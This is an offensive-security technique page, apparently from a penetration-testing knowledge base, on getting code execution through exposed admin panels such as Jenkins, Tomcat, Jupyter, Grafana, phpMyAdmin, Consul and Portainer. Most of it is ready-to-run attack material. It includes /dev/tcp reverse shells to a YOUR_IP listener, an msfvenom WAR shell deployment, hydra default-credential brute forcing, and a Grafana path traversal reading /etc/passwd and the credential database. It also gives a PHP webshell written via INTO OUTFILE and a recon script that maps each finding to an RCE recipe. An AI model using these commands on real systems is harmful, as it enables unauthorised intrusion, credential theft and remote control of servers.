---
title: "Exposed Admin/Dev Interfaces - The Path to RCE for Each"
category: misc
subcategory: network-services
type: technique
tags: [jenkins, tomcat, jupyter, grafana, phpmyadmin, portainer, consul, airflow, rce, admin-interface, default-credentials, actuator, werkzeug, network-services]
difficulty: medium
summary: "Each management UI has a documented feature that runs code: Groovy consoles, WAR uploads, notebook cells, DAGs, SQL INTO OUTFILE. Identify, auth, execute."
when_to_use:
  - "A web port hosts a recognisable admin/dev product (Jenkins, Tomcat, Grafana, ...)"
  - "You have default or weak credentials to a management interface"
  - "You need to convert 'I can log into the panel' into code execution"
  - "A dev/CI/orchestration service is exposed to the network"
cves: [CVE-2021-43798, CVE-2020-11978, CVE-2020-17526]
tools: [curl, msfvenom, hydra, nuclei, netexec]
related: [svc-default-credentials, svc-cve-exploitation-workflow, net-reverse-shells]
---

## TL;DR

Management interfaces expose "run code" as a *feature*. The workflow is always: identify the
product and version, get in (default creds / unauthenticated bug), then use the documented feature
that executes code -- a Groovy console, a WAR upload, a notebook cell, a DAG, or a SQL `INTO OUTFILE`.

## Recognise it

- A login page with a product logo, a specific favicon, or a `Server`/`X-Powered-By` header.
- A default port: 8080 (Jenkins/Tomcat/Airflow), 8888 (Jupyter), 3000 (Grafana), 9000/9443
  (Portainer), 8500 (Consul), 5601 (Kibana).

## Attack

### Jenkins (8080)

```bash
# Fingerprint: the login page and /api reveal the version
curl -s http://10.10.10.5:8080/login | grep -i jenkins
curl -s http://10.10.10.5:8080/ -I | grep -i x-jenkins

# RCE via the Groovy script console (needs admin, or anonymous if misconfigured)
curl -s -u admin:admin -X POST http://10.10.10.5:8080/scriptText \
  --data-urlencode 'script=println "id".execute().text'

# Reverse shell through the Groovy console
curl -s -u admin:admin -X POST http://10.10.10.5:8080/scriptText \
  --data-urlencode 'script=r=Runtime.getRuntime();r.exec(["/bin/bash","-c","bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"] as String[])'
```

Also: a build step (Execute shell / Execute Windows batch) runs code as the Jenkins user; the CLI
had deserialization RCEs in older versions.

### Tomcat Manager (8080)

```bash
# Fingerprint and hit the manager
curl -s http://10.10.10.5:8080/manager/html -I

# Common default creds: tomcat:tomcat, tomcat:s3cret, admin:admin
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
  10.10.10.5 http-get /manager/html

# Build a WAR reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f war -o shell.war

# Deploy it via the manager text API
curl -s -u tomcat:tomcat --upload-file shell.war \
  "http://10.10.10.5:8080/manager/text/deploy?path=/shell&update=true"

# Trigger it
curl -s http://10.10.10.5:8080/shell/
```

`/host-manager/html` manages virtual hosts and has its own credentials worth trying.

### Jupyter Notebook / Lab (8888)

```bash
# The token is often in the URL or logs; try no-token
curl -s http://10.10.10.5:8888/

# With a token, open a terminal (JupyterLab) or run a cell:
#   in a notebook cell:  import os; os.system("bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'")

# Create a terminal via the API (token in the header/query)
curl -s -X POST "http://10.10.10.5:8888/api/terminals?token=TOKEN"
```

### Grafana (3000)

```bash
# Default admin:admin (forces a password change on first login, but API access remains)
curl -s -u admin:admin http://10.10.10.5:3000/api/org

# CVE-2021-43798: unauthenticated path traversal via the plugin route (Grafana 8.x)
curl -s --path-as-is 'http://10.10.10.5:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'
# Read the Grafana DB to recover admin creds / data source secrets
curl -s --path-as-is 'http://10.10.10.5:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db' -o grafana.db
```

With admin you can add a data source and abuse it (e.g. an MSSQL/PostgreSQL source to reach a DB).

### phpMyAdmin

```bash
# Common: root with a blank password, or root:root
# Once logged in, write a webshell via SQL INTO OUTFILE (needs FILE priv and a writable web dir)
#   SELECT "<?php system($_GET['c']);?>" INTO OUTFILE "/var/www/html/s.php";
# Then:
curl -s 'http://10.10.10.5/s.php?c=id'
```

The generic query-log trick (SET global general_log_file + general_log=ON to log a payload into a
.php file) is a fallback when INTO OUTFILE is blocked.

### Portainer (9000 / 9443)

```bash
# If the initial admin has never been set, you can claim it (visit and set a password)
curl -s http://10.10.10.5:9000/api/users/admin/check
# With admin, create a container that bind-mounts the host root, giving root file access:
#   Volumes: /:/host   ->  chroot /host, or read /host/etc/shadow, write an SSH key
```

### Consul (8500)

```bash
# List services and the KV store (often full of secrets)
curl -s http://10.10.10.5:8500/v1/agent/services
curl -s http://10.10.10.5:8500/v1/kv/?recurse

# RCE when enable_script_checks is true: register a service with a script health check
curl -s -X PUT http://10.10.10.5:8500/v1/agent/service/register \
  -d '{"Name":"x","Check":{"Args":["/bin/sh","-c","bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"],"Interval":"10s"}}'
```

### Airflow (8080)

```bash
# Default admin:admin on the web UI. With login, create/trigger a DAG using BashOperator,
# or use the REST API:
curl -s -u admin:admin http://10.10.10.5:8080/api/v1/dags

# Old versions: CVE-2020-11978 (example DAG command injection), CVE-2020-17526 (default Flask
# secret key -> session forgery). Confirm the version before relying on these.
```

### Quick blocks

```bash
# Kubernetes / Rancher dashboard: an unauthenticated dashboard = create a privileged pod
kubectl --server=https://10.10.10.5:6443 --insecure-skip-tls-verify get pods -A

# Werkzeug debugger (Flask debug=True): the /console PIN can be reconstructed from machine info,
# or is disabled -> arbitrary Python. Look for "Werkzeug Debugger" on a 500 page.
curl -s http://10.10.10.5:5000/console

# Spring Boot Actuator: leak env/secrets, dump heap for tokens
curl -s http://10.10.10.5:8080/actuator/env
curl -s http://10.10.10.5:8080/actuator/heapdump -o heap.bin

# Apache Struts / OGNL: version-gated RCE via crafted Content-Type / parameters (verify version).
```

## Generic methodology

1. **Identify** the product and exact version (favicon, headers, /login, static asset paths).
2. **Version** -> check for an unauthenticated CVE before bothering with creds.
3. **Auth** with default/weak creds (see `svc-default-credentials`) or the unauthenticated bug.
4. **Documented code-exec feature** -- every one of these ships one; use it, do not reinvent.
5. **Upload/execute** a payload, **callback** to your listener, verify with `id`/`whoami`.

## Code

Fingerprint-and-route helper: probes the common admin ports/paths and prints the specific RCE recipe
for whatever it finds.

```python
#!/usr/bin/env python3
"""Detect exposed admin interfaces on a host and print the RCE route for each.

Usage:
    python3 admin_recon.py 10.10.10.5
"""
from __future__ import annotations

import sys
from urllib.error import URLError
from urllib.request import Request, urlopen

TIMEOUT = 5

SIGNATURES = [
    (8080, "/manager/html", "tomcat", "WAR upload: msfvenom -f war -> /manager/text/deploy"),
    (8080, "/login", "jenkins", "Groovy console: POST /scriptText script=..."),
    (8080, "/api/v1/dags", "airflow", "admin:admin -> DAG BashOperator / REST API"),
    (8888, "/", "jupyter", "token -> new terminal / os.system in a cell"),
    (3000, "/login", "grafana", "admin:admin; try CVE-2021-43798 path traversal"),
    (9000, "/api/users/admin/check", "portainer", "claim admin -> container w/ host bind mount"),
    (8500, "/v1/agent/services", "consul", "script check RCE if enable_script_checks"),
    (5000, "/console", "werkzeug", "debug console -> arbitrary Python if PIN off"),
    (8080, "/actuator/env", "spring-actuator", "leak env / dump /actuator/heapdump"),
    (80, "/phpmyadmin/", "phpmyadmin", "weak DB creds -> SELECT INTO OUTFILE webshell"),
]


def get(host: str, port: int, path: str) -> tuple[int, str]:
    """GET a URL, returning (status, first 400 bytes) tolerating errors."""
    url = f"http://{host}:{port}{path}"
    req = Request(url, headers={"User-Agent": "admin_recon/1.0"})
    try:
        with urlopen(req, timeout=TIMEOUT) as resp:
            return resp.status, resp.read(400).decode("utf-8", "replace")
    except URLError as exc:
        code = getattr(exc, "code", 0)
        return code, ""
    except OSError:
        return 0, ""


def main(argv: list[str]) -> int:
    if len(argv) != 2:
        print(__doc__)
        return 1
    host = argv[1]
    for port, path, name, recipe in SIGNATURES:
        status, body = get(host, port, path)
        if status in (200, 401, 403, 302) or name in body.lower():
            print(f"[+] {name:<16} {host}:{port}{path}  (HTTP {status})")
            print(f"      -> {recipe}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **Fingerprint before firing.** A CVE tied to Grafana 8.x or CouchDB 1.x is useless on other
  versions and may crash the service.
- **Default creds are per-product.** Use the product-specific default lists, not a generic one.
- **WAR path.** Tomcat's `/manager/text/deploy?path=/x` deploys the app at `/x/`; hit the JSP there.
- **Grafana forces a password change** on the default admin, but API access and the traversal CVE do
  not need the UI login.
- **Consul/Airflow/Portainer RCE is a feature** gated by a config flag or an unset-admin state --
  check the specific precondition.
- **Werkzeug PIN** is only reconstructable with local file read; otherwise the console needs the PIN.
- **Verify with a callback.** A 200 on a deploy is not proof of execution -- confirm with `id`.

## Tools

- `curl` -- the universal client for all of these.
- `msfvenom` -- WAR/JSP/exe payloads.
- `hydra` / `netexec` -- credential attacks on the login.
- `nuclei` -- templates for many of these exposures and CVEs.

## References

- The product documentation for each (Jenkins script console, Tomcat manager, Airflow REST API).
- CVE-2021-43798 (Grafana traversal), CVE-2020-11978 and CVE-2020-17526 (Airflow).
